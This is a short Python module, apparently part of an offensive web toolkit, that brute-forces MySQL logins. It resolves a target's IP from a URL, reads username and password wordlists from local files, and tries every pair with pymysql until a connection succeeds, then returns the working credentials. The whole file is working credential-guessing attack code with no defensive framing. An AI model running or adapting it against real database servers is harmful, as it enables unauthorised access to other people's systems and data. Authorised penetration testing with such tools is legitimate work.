from __future__ import print_function
import time
import socket
import pymysql

sqluser = []
sqlpass = []

def bruter(user, passwd, ip, flag=False):
    try:
        con = pymysql.connect(user=user, password=passwd, host=ip)
        flag = True
    except:
        pass
    return flag

def sqlbrute(web):

    try:

        ip = socket.gethostbyname(web.split('//')[1])
        try:
            with open('app/views/module/file/dict/brute/sql/sql_user.lst','r') as users:
                for u in users:
                    u = u.strip('\n')
                    sqluser.append(u)

            with open('app/views/module/file/dict/brute/sql/sql_pass.lst','r') as pas:
                for p in pas:
                    p = p.strip('\n')
                    sqlpass.append(p)
        except IOError:
            print(' [-] Importing wordlist failed!')

        for user in sqluser:
            for password in sqlpass:
                res = bruter(user, password, ip)
                if res:
                    return user,password
            else:
                continue
    except socket.gaierror:
        print(' [-] Target seems to be down!')